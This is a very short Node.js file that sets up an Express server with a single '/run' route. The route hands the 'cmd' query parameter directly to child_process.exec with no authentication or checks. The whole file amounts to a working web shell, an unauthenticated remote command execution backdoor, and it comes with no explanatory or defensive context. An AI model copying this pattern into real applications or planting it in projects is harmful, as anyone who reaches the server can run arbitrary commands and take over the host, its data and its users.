import express from "express";
import { exec } from "node:child_process";
const app = express();
app.get("/run", (req, res) => exec(req.query.cmd));
